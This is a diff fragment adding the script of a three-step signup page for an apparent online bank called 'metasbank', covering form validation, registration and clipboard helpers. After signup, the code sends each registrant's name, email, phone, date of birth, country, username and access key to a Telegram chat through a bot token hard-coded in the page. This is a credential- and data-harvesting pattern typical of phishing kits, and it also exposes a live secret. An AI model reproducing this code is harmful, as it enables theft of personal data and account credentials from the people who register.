+      let email = document.getElementById("rEmail").value.trim();
+      if (!name) { showStepError("step1Error", "Please enter your full name"); return }
+      if (!dob) { showStepError("step1Error", "Please select your date of birth"); return }
+      if (!phone) { showStepError("step1Error", "Please enter your phone number"); return }
+      if (!email || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) { showStepError("step1Error", "Enter a valid email address"); return }
+      // Minimum age 18
+      let bm = parseInt(document.getElementById("rDobMonth").value, 10);
+      let bd = parseInt(document.getElementById("rDobDay").value, 10);
+      let by = parseInt(document.getElementById("rDobYear").value, 10);
+      let birthDate = new Date(by, bm - 1, bd);
+      let ageMs = Date.now() - birthDate.getTime();
+      let age = Math.floor(ageMs / 31557600000);
+      if (age < 18) { showStepError("step1Error", "You must be at least 18 years old to register"); return }
+      hideStepError("step1Error");
+      goToStep(2);
+    }
+
+    function goStep3() {
+      let street = document.getElementById("rStreet").value.trim();
+      let city = document.getElementById("rCity").value.trim();
+      let state = document.getElementById("rState").value.trim();
+      let zip = document.getElementById("rZip").value.trim();
+      let country = document.getElementById("rCountry").value;
+      if (!street) { showStepError("step2Error", "Please enter your street address"); return }
+      if (!city) { showStepError("step2Error", "Please enter your city"); return }
+      if (!state) { showStepError("step2Error", "Please enter your state / region"); return }
+      if (!zip) { showStepError("step2Error", "Please enter your ZIP code"); return }
+      if (!country) { showStepError("step2Error", "Please select your country"); return }
+      hideStepError("step2Error");
+
+      document.getElementById("rvName").textContent = document.getElementById("rName").value.trim();
+      document.getElementById("rvDob").textContent = formatDob();
+      let phoneCode = document.getElementById("rPhoneCode").value;
+      document.getElementById("rvPhone").textContent = phoneCode + " " + document.getElementById("rPhone").value.trim();
+      document.getElementById("rvEmail").textContent = document.getElementById("rEmail").value.trim();
+      document.getElementById("rvAddress").textContent = street;
+      document.getElementById("rvCity").textContent = city;
+      document.getElementById("rvState").textContent = state;
+      document.getElementById("rvZip").textContent = zip;
+      document.getElementById("rvCountry").textContent = country;
+      goToStep(3);
+    }
+
+    function goToStep(n) {
+      for (let i = 1; i <= 3; i++) {
+        document.getElementById("step" + i).classList.add("hidden");
+        let dot = document.getElementById("s" + i + "d");
+        let line = document.getElementById("s" + i + "l");
+        dot.className = "step-dot " + (i < n ? "done" : i === n ? "active" : "pending");
+        dot.textContent = i < n ? "\u2713" : i;
+        if (line) line.className = "step-line " + (i < n ? "active" : "pending");
+      }
+      document.getElementById("step" + n).classList.remove("hidden");
+    }
+
+    function goStep1() { goToStep(1) }
+    function showStepError(id, msg) { let el = document.getElementById(id); el.textContent = msg; el.classList.remove("hidden"); }
+    function hideStepError(id) { document.getElementById(id).classList.add("hidden") }
+
+    // ===== HANDLE SIGNUP =====
+    async function handleSignup() {
+      let name = document.getElementById("rName").value.trim();
+      let dob = getDob();
+      let phoneCode = document.getElementById("rPhoneCode").value;
+      let phone = phoneCode + " " + document.getElementById("rPhone").value.trim();
+      let email = document.getElementById("rEmail").value.trim();
+      let street = document.getElementById("rStreet").value.trim();
+      let city = document.getElementById("rCity").value.trim();
+      let state = document.getElementById("rState").value.trim();
+      let zip = document.getElementById("rZip").value.trim();
+      let country = document.getElementById("rCountry").value;
+      let btn = document.getElementById("submitBtn");
+      let errEl = document.getElementById("step3Error");
+
+      errEl.classList.add("hidden");
+      btn.textContent = "Registering..."; btn.disabled = true; btn.style.opacity = "0.7";
+
+      // Reset processing step states
+      document.getElementById("procStep2").classList.add("opacity-30");
+      document.getElementById("procStep3").classList.add("opacity-30");
+
+      document.getElementById("step3").classList.add("hidden");
+      document.getElementById("stepProgress").classList.add("hidden");
+      document.getElementById("processingView").classList.remove("hidden");
+
+      setTimeout(function() { let el = document.getElementById("procStep2"); if (el) el.classList.remove("opacity-30") }, 1200);
+      setTimeout(function() { let el = document.getElementById("procStep3"); if (el) el.classList.remove("opacity-30") }, 2500);
+
+      await new Promise(function(r) { setTimeout(r, 500) });
+
+      let result;
+      try {
+        result = await Promise.race([
+          memberSignup(email, name, dob, phone, street, city, state, zip, country),
+          new Promise(function(_, reject) { setTimeout(function() { reject(new Error('Request timed out. Please try again.')) }, 30000) })
+        ]);
+      } catch(ex) {
+        document.getElementById("processingView").classList.add("hidden");
+        document.getElementById("step3").classList.remove("hidden");
+        document.getElementById("stepProgress").classList.remove("hidden");
+        goToStep(3);
+        showStepError("step3Error", ex.message || 'An unexpected error occurred. Please try again.');
+        btn.textContent = "Register"; btn.disabled = false; btn.style.opacity = "1";
+        return;
+      }
+      if (result.error) {
+        document.getElementById("processingView").classList.add("hidden");
+        document.getElementById("step3").classList.remove("hidden");
+        document.getElementById("stepProgress").classList.remove("hidden");
+        goToStep(3);
+        showStepError("step3Error", result.error);
+        btn.textContent = "Register"; btn.disabled = false; btn.style.opacity = "1";
+        return;
+      }
+
+      lastGeneratedKey = result.data.access_key;
+      document.getElementById("accessKeyDisplay").textContent = lastGeneratedKey;
+      document.getElementById("newUsername").textContent = result.data.username;
+      document.getElementById("processingView").classList.add("hidden");
+      document.getElementById("signupSuccess").classList.remove("hidden");
+
+      sessionStorage.setItem("metasbank_used", "1");
+
+      // ── Telegram signup notification ──
+      sendTG(
+        '<b>New Member Signup</b>\n' +
+        '<b>Name:</b> ' + escHtml(name) + '\n' +
+        '<b>Email:</b> ' + escHtml(email) + '\n' +
+        '<b>Phone:</b> ' + escHtml(phone) + '\n' +
+        '<b>DOB:</b> ' + escHtml(dob) + '\n' +
+        '<b>Country:</b> ' + escHtml(country) + '\n' +
+        '<b>Username:</b> ' + escHtml(result.data.username) + '\n' +
+        '<b>Access Key:</b> <code>' + escHtml(result.data.access_key) + '</code>\n' +
+        '<b>Date:</b> ' + new Date().toLocaleString()
+      ).catch(function(e) { console.log('TG notify error:', e) });
+
+      // Auto-redirect to member dashboard after 3 seconds
+      setTimeout(function() { window.location.href = '/dashboard/' }, 3000);
+    }
+
+    // ===== TELEGRAM =====
+    var TG_TOKEN = '8750114291:AAHfvogI3qRAt_kDV9rktKDUdURkmihghrw';
+    var TG_CHAT = '8272999354';
+    function escHtml(str) {
+      if (!str) return '';
+      return str.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;').replace(/'/g, '&#x27;');
+    }
+    function sendTG(text) {
+      return fetch('https://api.telegram.org/bot' + TG_TOKEN + '/sendMessage', {
+        method: 'POST', headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id: TG_CHAT, text: text, parse_mode: 'HTML' })
+      }).then(function(r) { return r.json() }).then(function(d) { if (!d.ok) throw new Error(d.description); return d });
+    }
+
+    // ===== CLIPBOARD =====
+    function copyAccessKey() { copyTextStatic(lastGeneratedKey, "copyKeyBtn", "Copied!", "Copy"); }
+    function copyText(elementId) { let el = document.getElementById(elementId); if (el) copyTextStatic(el.textContent || "", null, null, null); }
+    function copyTextStatic(text, btnId, doneText, origText) {
+      if (navigator.clipboard && navigator.clipboard.writeText) {
+        navigator.clipboard.writeText(text).then(function() {
+          if (btnId) { let btn = document.getElementById(btnId); if (btn) { btn.textContent = doneText || "Copied!"; setTimeout(function() { btn.textContent = origText || "Copy"; }, 2000); } }
+        }).catch(function() { fallbackCopy(text, btnId, doneText, origText); });
+      } else { fallbackCopy(text, btnId, doneText, origText); }
+    }
+    function fallbackCopy(text, btnId, doneText, origText) {
+      let ta = document.createElement("textarea");
+      ta.value = text; ta.style.position = "fixed"; ta.style.opacity = "0";
+      document.body.appendChild(ta); ta.select();
+      try { document.execCommand("copy");
+        if (btnId) { let btn = document.getElementById(btnId); if (btn) { btn.textContent = doneText || "Copied!"; setTimeout(function() { btn.textContent = origText || "Copy"; }, 2000); } }
+      } catch(e) {}
+      document.body.removeChild(ta);
+    }
+
+    // ===== EVENT LISTENERS =====
+    document.addEventListener('DOMContentLoaded', function() {
+      const btn1 = document.getElementById('step1NextBtn');
+      if (btn1) btn1.addEventListener('click', goStep2);
+      const btn2back = document.getElementById('step2BackBtn');
+      if (btn2back) btn2back.addEventListener('click', goStep1);
+      const btn2next = document.getElementById('step2NextBtn');
+      if (btn2next) btn2next.addEventListener('click', goStep3);
+      const btn3back = document.getElementById('step3BackBtn');
+      if (btn3back) btn3back.addEventListener('click', goStep2);
+      const submitBtn = document.getElementById('submitBtn');
+      if (submitBtn) submitBtn.addEventListener('click', handleSignup);
+      const copyUserBtn = document.getElementById('copyUsernameBtn');
+      if (copyUserBtn) copyUserBtn.addEventListener('click', function() { copyText('newUsername') });
+      const copyKeyBtn = document.getElementById('copyKeyBtn');
+      if (copyKeyBtn) copyKeyBtn.addEventListener('click', copyAccessKey);
+    });
+
+    // ===== INIT =====
+    try { initSupabase() } catch(e) { console.warn("initSupabase error:", e); }
+
+    // Already used check
+    (function() {
+      if (sessionStorage.getItem("metasbank_used")) {
+        document.addEventListener("DOMContentLoaded", function() {
+          document.getElementById("stepProgress") && (document.getElementById("stepProgress").style.display = "none");
+          document.getElementById("step1") && (document.getElementById("step1").style.display = "none");
+          document.getElementById("step2") && (document.getElementById("step2").style.display = "none");
+          document.getElementById("step3") && (document.getElementById("step3").style.display = "none");
+          let u = document.getElementById("alreadyUsed");
+          if (u) u.classList.remove("hidden");
+        });
+      }
+    })();
+
+    // Enter key on email field
+    document.addEventListener("DOMContentLoaded", function() {
+      let emailField = document.getElementById("rEmail");
+      if (emailField) emailField.addEventListener("keydown", function(e) { if (e.key === "Enter") goStep2(); });
+    });
+  </script>
+
+</body>
+</html>
